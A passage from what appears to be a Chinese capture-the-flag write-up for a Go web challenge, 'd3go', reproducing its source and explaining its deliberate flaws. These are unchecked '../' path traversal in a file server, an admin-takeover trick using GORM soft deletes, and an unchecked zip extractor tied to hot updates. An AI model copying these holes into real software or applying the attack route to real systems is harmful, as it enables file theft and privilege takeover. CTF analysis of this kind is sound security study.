class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/service/auth&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/service/upload&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/google/uuid&quot;</span></span><br><span class="line"><span class="string">&quot;path&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Resp <span class="keyword">struct</span> &#123;</span><br><span class="line">StatusCode <span class="type">int</span>    <span class="string">`json:&quot;status_code&quot;`</span></span><br><span class="line">StatusMsg  <span class="type">string</span> <span class="string">`json:&quot;status_msg,omitempty&quot;`</span></span><br><span class="line">Data       any    <span class="string">`json:&quot;data&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ErrFormatError = <span class="string">&quot;format error&quot;</span></span><br><span class="line"><span class="keyword">var</span> ErrInternalServer = <span class="string">&quot;internal server error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">u := &amp;model.User&#123;&#125;</span><br><span class="line">err := c.ShouldBindJSON(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">permission, err := auth.Login(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrInternalServer,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">switch</span> permission &#123;</span><br><span class="line"><span class="keyword">case</span> auth.UnAuthed:</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">case</span> auth.User:</span><br><span class="line">session.Set(<span class="string">&quot;admin&quot;</span>, <span class="literal">false</span>)</span><br><span class="line">session.Save()</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">case</span> auth.Admin:</span><br><span class="line">session.Set(<span class="string">&quot;admin&quot;</span>, <span class="literal">true</span>)</span><br><span class="line">session.Save()</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login as admin success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> u model.User</span><br><span class="line">err := c.ShouldBindJSON(&amp;u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = auth.Register(&amp;u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrInternalServer,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;register success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Upload</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">f, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (f.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/zip&quot;</span> &amp;&amp; f.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/x-zip-compressed&quot;</span>) || path.Ext(f.Filename) != <span class="string">&quot;.zip&quot;</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;not a zip file&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uu := uuid.New()</span><br><span class="line"></span><br><span class="line">zipPath := path.Join(<span class="string">&quot;upload&quot;</span>, uu.String()+<span class="string">&quot;.zip&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := c.SaveUploadedFile(f, zipPath); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;save zip fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tree, err := upload.Unzip(zipPath, path.Join(<span class="string">&quot;unzipped&quot;</span>, uu.String()))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload success&quot;</span>,</span><br><span class="line">Data:       tree.Children,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>db.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> db</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;math/rand&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;gorm.io/driver/mysql&quot;</span></span><br><span class="line"><span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ErrDatabase = errors.New(<span class="string">&quot;database error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> db *gorm.DB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := tryOpen(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">err := db.AutoMigrate(&amp;model.User&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// create admin</span></span><br><span class="line">rand.Seed(time.Now().UnixMicro())</span><br><span class="line"><span class="keyword">var</span> rad [<span class="number">32</span>]<span class="type">byte</span></span><br><span class="line">rand.Read(rad[:])</span><br><span class="line"><span class="keyword">if</span> ok, _ := IsFirstRegistered(); ok &#123;</span><br><span class="line">db.Save(&amp;model.User&#123;</span><br><span class="line">Username: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">Password: hex.EncodeToString(rad[:]),</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">tryOpen</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line"><span class="keyword">var</span> database *gorm.DB</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">database, err = gorm.Open(mysql.Open(config.Conf.DBUser+<span class="string">&quot;:&quot;</span>+config.Conf.DBPasswd+<span class="string">&quot;@tcp(&quot;</span>+config.Conf.DBHost+<span class="string">&quot;:&quot;</span>+config.Conf.DBPort+<span class="string">&quot;)/db?parseTime=True&quot;</span>), &amp;gorm.Config&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">time.Sleep(time.Second * <span class="number">3</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">db = database</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsAdmin</span><span class="params">(u *model.User)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">var</span> admin model.User</span><br><span class="line"><span class="keyword">if</span> err := db.First(&amp;admin).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> u.Username == admin.Username</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AddUser</span><span class="params">(u *model.User)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.Save(u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, u).Error(err)</span><br><span class="line"><span class="keyword">return</span> ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckAuth</span><span class="params">(u *model.User)</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.Where(<span class="string">&quot;username = ? AND password = ?&quot;</span>, u.Username, u.Password).First(&amp;u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> errors.Is(err, gorm.ErrRecordNotFound) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, u).Error(err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsFirstRegistered</span><span class="params">()</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.First(&amp;model.User&#123;&#125;).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> errors.Is(err, gorm.ErrRecordNotFound) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, model.User&#123;&#125;).Error(err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>auth.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> auth</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/db&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">UnAuthed <span class="type">int</span> = <span class="literal">iota</span> - <span class="number">1</span></span><br><span class="line">User</span><br><span class="line">Admin</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(u *model.User)</span></span> (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">ok, err := db.CheckAuth(u)</span><br><span class="line"><span class="keyword">if</span> !ok || err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> UnAuthed, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> config.Conf.NoAdminLogin &amp;&amp; u.ID == <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> UnAuthed, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> db.IsAdmin(u) &#123;</span><br><span class="line"><span class="keyword">return</span> Admin, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> User, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(u *model.User)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">return</span> db.AddUser(u)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>upload.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> upload</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;archive/zip&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/utils&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;path&quot;</span></span><br><span class="line"><span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Unzip</span><span class="params">(zipPath <span class="type">string</span>, outputPath <span class="type">string</span>)</span></span> (*utils.Tree, <span class="type">error</span>) &#123;</span><br><span class="line">r, err := zip.OpenReader(zipPath)</span><br><span class="line"><span class="keyword">defer</span> r.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(outputPath, <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">tree := utils.NewTree(filepath.Base(outputPath))</span><br><span class="line"><span class="keyword">for</span> _, f := <span class="keyword">range</span> r.File &#123;</span><br><span class="line">utils.Paths2Tree(f.Name, path.Join(outputPath, f.Name), tree)</span><br><span class="line">p, _ := filepath.Abs(filepath.Join(outputPath, f.Name))</span><br><span class="line">content, err := f.Open()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data, err := io.ReadAll(content)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(filepath.Dir(p), <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := os.WriteFile(p, data, <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">content.Close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> tree, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>稍微审一下题，首先在main.go有这么一段</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ServeFile</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// unzipped file server</span></span><br><span class="line">p := c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> strings.HasPrefix(p, <span class="string">&quot;/unzipped&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">9</span> &#123;</span><br><span class="line">p = <span class="string">&quot;/&quot;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p = p[<span class="number">9</span>:]</span><br><span class="line">&#125;</span><br><span class="line">c.FileFromFS(p, http.Dir(<span class="string">&quot;./unzipped&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// embed static file server</span></span><br><span class="line">p = <span class="string">&quot;/static/&quot;</span> + c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line">c.FileFromFS(p, http.FS(Static))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一段对静态文件做了些处理，他直接就没对../进行处理，导致我们可以任意目录穿越，也就是一开始我们任意文件读取，读取完后再注意一下controller里的这一段</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">u := &amp;model.User&#123;&#125;</span><br><span class="line">err := c.ShouldBindJSON(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">gorm.Model</span><br><span class="line">Username <span class="type">string</span> <span class="string">`gorm:&quot;type:varchar(20);not null;unique&quot; json:&quot;username&quot;`</span></span><br><span class="line">Password <span class="type">string</span> <span class="string">`gorm:&quot;type:varchar(100);not null&quot; json:&quot;password&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后对应的user.go如上，是一个struct，但是里面有一个字段需要注意</p><p><img src="../images/image-20230507162913703.png" alt="image-20230507162913703"></p><p>给了 gorm.model 就说明自带deletedat字段，也就是有软删除这么一说，软删除也就是非实际删除数据库数据，而是单纯无法查询出来。结合一下上面的源码，我们的目的是以admin登录然后去上传zip文件，因此我们应该软链接先删除一下admin：</p><p>这里的话admin是数据库中的第一个用户</p><p><img src="../images/image-20230507164038666.png" alt="image-20230507164038666"></p><p><img src="../images/image-20230507164030525.png" alt="image-20230507164030525"></p><p>然后再创建一个用户</p><p><img src="../images/image-20230507164129892.png" alt="image-20230507164129892"></p><p>之后登录test就是管理员了，因为代码里的逻辑是ID为1的用户就是管理员，那么接下来就好说了，由题目中config.go和main.go可以得知实现了热部署</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">config.Init()</span><br><span class="line">db.Init()</span><br><span class="line"><span class="keyword">if</span> config.Conf.AutoUpdate &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;Auto update enabled&quot;</span>)</span><br><span class="line">err := overseer.RunErr(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Fetcher: &amp;config.Fetch,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line"><span class="keyword">if</span> err := r.Run(<span class="string">&quot;:8080&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span 